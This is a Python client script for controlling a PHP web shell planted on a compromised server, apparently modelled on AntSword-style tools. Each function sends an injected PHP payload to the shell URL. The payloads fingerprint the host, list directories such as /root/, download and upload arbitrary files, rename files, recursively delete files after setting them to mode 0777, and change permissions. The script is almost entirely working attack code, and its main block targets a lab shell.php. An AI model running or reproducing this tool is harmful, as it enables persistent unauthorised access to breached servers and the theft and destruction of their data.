#!/usr/bin/env python
# -*- coding: utf-8 -*-
# author: r1ngs
# contact: r1ngs@outlook.com
# datetime: 2021/1/8 18:16
# software: PyCharm

import requests, urllib.parse, socket, re
from random import randint
from base64 import b64decode, b64encode

def genRandomStr(num):
    r = []
    for _ in range(num):
        r.append(hex(randint(16 ** 7, 16 ** 8))[2:])
    return r

def dns_resolver(url):
    parse = urllib.parse.urlparse(url)
    url_new = parse.netloc
    if url_new == '':
        raise Exception('URL Format Error!')
    result = socket.getaddrinfo(url_new, None)
    IP = result[0][4][0]

    return IP

def TestConn(url, password):
    ra, rb = genRandomStr(2)
    testPayload = '@ini_set("display_errors", "0");@set_time_limit(0);function asenc($out){return $out;};function ' \
                  'asoutput(){$output=ob_get_contents();ob_end_clean();echo "'+ ra +'";echo @asenc($output);echo "'+rb+'";}' \
                  'ob_start();try{$D=dirname($_SERVER["SCRIPT_FILENAME"]);if($D=="")$D=dirname($_SERVER["PATH_TRANSLATED"]);' \
                  '$R="{$D}\n";if(substr($D,0,1)!="/"){foreach(range("C","Z")as $L)if(is_dir("{$L}:"))$R.="{$L}:";}else' \
                  '{$R.="/";}$R.="\n";$u=(function_exists("posix_getegid"))?@posix_getpwuid(@posix_geteuid()):"";$s=($u)' \
                  '?$u["name"]:@get_current_user();$R.=php_uname();$R.="\n{$s}";echo $R;;}catch(Exception $e){echo ' \
                  '"ERROR://".$e->getMessage();};asoutput();die();'
    data = {password:testPayload}
    r= requests.post(url, data, timeout=0.8)
    rt = r.text

    # 排除404等的测试结果
    if r.status_code != 200:
        raise Exception('status_code == '+str(r.status_code))
    # 是否正确对payload进行响应
    if  rt[8:].startswith('ERROR://'):
        raise Exception(rt[8:-8])

    if rt.startswith(ra) and rt.endswith(rb):
        return rt[8:-8]
    else:
        raise Exception('PassWord Error!')

def scanDir(url, password, dir):
    ra, rb, rc = genRandomStr(3)
    payload = '@ini_set("display_errors", "0");@set_time_limit(0);function asenc($out){return $out;};function ' \
                  'asoutput(){$output=ob_get_contents();ob_end_clean();echo "' + ra + '";echo @asenc($output);echo "' + rb + '";}' \
                  'ob_start();try{$D=base64_decode($_POST["' + rc + '"]);$F=@opendir($D);if($F==NULL)' \
                  '{echo("ERROR:// Path Not Found Or No Permission!");}else{$M=NULL;$L=NULL;while($N=@readdir($F))' \
                  '{$P=$D.$N;$T=@date("Y-m-d H:i:s",@filemtime($P));@$E=substr(base_convert(@fileperms($P),10,8),-4);' \
                  '$R="\t".$T."\t".@filesize($P)."\t".$E."\n";if(@is_dir($P))$M.=$N."/".$R;else $L.=$N.$R;}echo $M.$L;' \
                  '@closedir($F);};}catch(Exception $e){echo "ERROR://".$e->getMessage();};asoutput();die();'
    data = {password : payload, rc : b64encode(dir.encode())}
    r = requests.post(url, data, timeout=0.8)
    rt = r.text
    # 排除404等的测试结果
    if r.status_code != 200:
        raise Exception('status_code == '+str(r.status_code))
    # 是否正确对payload进行响应
    if  rt[8:].startswith('ERROR://'):
        raise Exception(rt[8:-8])

    if rt.startswith(ra) and rt.endswith(rb):
        return rt[8:-8]
    else:
        raise Exception('PassWord Error!')

def downloadFile(url, password, filePath):
    ra, rb, rc = genRandomStr(3)
    payload = 'header("Content-Type: application/octet-stream");@ini_set("display_errors", "0");@set_time_limit(0);function asenc($out){return $out;};function asoutput()' \
              '{$output=ob_get_contents();ob_end_clean();echo "'+ ra +'";echo @asenc($output);echo "'+ rb +'";}ob_start();' \
              'try{$F=base64_decode(get_magic_quotes_gpc()?stripslashes($_POST["'+ rc +'"]):$_POST["'+ rc +'"]);' \
              '$fp=@fopen($F,"r");if(@fgetc($fp)){@fclose($fp);@readfile($F);}else{echo("ERROR:// Can Not Read");};}' \
              'catch(Exception $e){echo "ERROR://".$e->getMessage();};asoutput();die();'
    data = {password : payload, rc : b64encode(filePath.encode())}
    r = requests.post(url, data, timeout=0.8)
    rt = r.text
    # 排除404等的测试结果
    if r.status_code != 200:
        raise Exception('status_code == '+str(r.status_code))
    # 是否正确对payload进行响应
    if  rt[8:].startswith('ERROR://'):
        raise Exception(rt[8:-8])

    if rt.startswith(ra) and rt.endswith(rb):
        return rt[8:-8]
    else:
        raise Exception('PassWord Error!')

def uploadFile(url, password, buffer, filePath):
    buffer = buffer.encode().hex()
    ra, rb, rc, rd = genRandomStr(4)
    payload = '@ini_set("display_errors", "0");@set_time_limit(0);function asenc($out){return $out;};function asoutput()' \
              '{$output=ob_get_contents();ob_end_clean();echo "'+ ra +'";echo @asenc($output);echo "'+ rb +'";}ob_start();' \
              'try{$f=base64_decode($_POST["'+ rd +'"]);$c=$_POST["'+ rc +'"];$c=str_replace("\n","",$c);' \
              '$c=str_replace("\n","",$c);$buf="";for($i=0;$i<strlen($c);$i+=2)$buf.=urldecode("%".substr($c,$i,2));' \
              'echo(@fwrite(fopen($f,"a"),$buf)?"1":"0");;}catch(Exception $e){echo "ERROR://".$e->getMessage();};asoutput();die();'

    data = {password: payload, rd: b64encode(filePath.encode()), rc: buffer}
    r = requests.post(url, data, timeout=0.8)
    rt = r.text
    # 排除404等的测试结果
    if r.status_code != 200:
        raise Exception('status_code == '+str(r.status_code))
    # 是否正确对payload进行响应
    if  rt[8:].startswith('ERROR://'):
        raise Exception(rt[8:-8])

    if rt.startswith(ra) and rt.endswith(rb):
        return rt[8:-8]
    else:
        raise Exception('PassWord Error!')

def renameFile(url, password, src, dst):
    ra, rb, rs, rd = genRandomStr(4)
    payload = '@ini_set("display_errors", "0");@set_time_limit(0);function asenc($out){return $out;};function asoutput()' \
              '{$output=ob_get_contents();ob_end_clean();echo "'+ ra +'";echo @asenc($output);echo "'+ rb +'";}ob_start();' \
              'try{$m=get_magic_quotes_gpc();$src=base64_decode(m?stripslashes($_POST["'+ rs +'"]):$_POST' \
              '["' + rs +'"]);$dst=base64_decode(m?stripslashes($_POST["'+ rd +'"]):$_POST["'+ rd +'"]' \
              ');echo(rename($src,$dst)?"1":"0");;}catch(Exception $e){echo "ERROR://".$e->getMessage();};asoutput();die();'
    data = {password: payload, rs: b64encode(src.encode()), rd: b64encode(dst.encode())}
    r = requests.post(url, data, timeout=0.8)
    rt = r.text
    # 排除404等的测试结果
    if r.status_code != 200:
        raise Exception('status_code == '+str(r.status_code))
    # 是否正确对payload进行响应
    if  rt[8:].startswith('ERROR://'):
        raise Exception(rt[8:-8])

    if rt.startswith(ra) and rt.endswith(rb):
        return rt[8:-8]
    else:
        raise Exception('PassWord Error!')

def deleteFile(url, password, file):
    ra, rb, rc = genRandomStr(3)
    payload = '@ini_set("display_errors", "0");@set_time_limit(0);function asenc($out){return $out;};function asoutput()' \
              '{$output=ob_get_contents();ob_end_clean();echo "'+ ra +'";echo @asenc($output);echo "'+ rb +'";}ob_start();' \
              'try{function df($p){$m=@dir($p);while(@$f=$m->read()){$pf=$p."/".$f;if((is_dir($pf))&&($f!=".")&&($f!=".."))' \
              '{@chmod($pf,0777);df($pf);}if(is_file($pf)){@chmod($pf,0777);@unlink($pf);}}$m->close();@chmod($p,0777);' \
              'return @rmdir($p);}$F=base64_decode(get_magic_quotes_gpc()?stripslashes($_POST["'+ rc +'"]):$_POST' \
              '["' + rc +'"]);if(is_dir($F))echo(df($F));else{echo(file_exists($F)?@unlink($F)?"1":"0":"0");};}' \
              'catch(Exception $e){echo "ERROR://".$e->getMessage();};asoutput();die();'
    data = {password: payload, rc: b64encode(file.encode())}
    r = requests.post(url, data, timeout=0.8)
    rt = r.text
    # 排除404等的测试结果
    if r.status_code != 200:
        raise Exception('status_code == '+str(r.status_code))
    # 是否正确对payload进行响应
    if  rt[8:].startswith('ERROR://'):
        raise Exception(rt[8:-8])

    if rt.startswith(ra) and rt.endswith(rb):
        return rt[8:-8]
    else:
        raise Exception('PassWord Error!')

def chmodFile(url, password, file, mode):
    ra, rb, rc, rd = genRandomStr(4)
    payload = '@ini_set("display_errors", "0");@set_time_limit(0);function asenc($out){return $out;};function asoutput()' \
              '{$output=ob_get_contents();ob_end_clean();echo "' + ra + '";echo @asenc($output);echo "' + rb+ '";}ob_start();try' \
              '{$m=get_magic_quotes_gpc();$FN=base64_decode(m?stripslashes($_POST["' + rc+ '"]):$_POST["' + rc + '"]);' \
              '$mode=base64_decode(m?stripslashes($_POST["' + rd + '"]):$_POST["' + rd +'"]);echo(chmod($FN,octdec($mode))?"1":"0")' \
              ';;}catch(Exception $e){echo "ERROR://".$e->getMessage();};asoutput();die();'
    data = {password: payload, rc: b64encode(file.encode()), rd: b64encode(mode.encode())}
    r = requests.post(url, data, timeout=0.8)
    rt = r.text
    # 排除404等的测试结果
    if r.status_code != 200:
        raise Exception('status_code == '+str(r.status_code))
    # 是否正确对payload进行响应
    if  rt[8:].startswith('ERROR://'):
        raise Exception(rt[8:-8])

    if rt.startswith(ra) and rt.endswith(rb):
        return rt[8:-8]
    else:
        raise Exception('PassWord Error!')

def formatFileSize(bytes, precision):
    for unit in ['B', 'KB', 'MB', 'GB', 'TB', 'PB', 'EB', 'ZB']:
        if abs(bytes) < 1024.0:
            return '%s %s' % (format(bytes, '.%df' % precision), unit)
        bytes /= 1024.0
    return '%s %s' % (format(bytes, '.%df' % precision), 'Yi')



if __name__ == '__main__':
    url = 'http://192.168.20.131/shell.php'
    password = '0'
    #print(downloadFile(url, password, '/var/www/html/1.py'))
    #print(uploadFile(url, password, '123', '/var/www/html/1.txt'))
    #print(scanDir(url, password, '/root/'))
    #print(formatFileSize(102401, 2))
    #print(renameFile(url, password, '/var/www/html/1', '/var/www/html/2'))
    print(chmodFile(url, password, '/var/www/html/shell.php', '0111'))
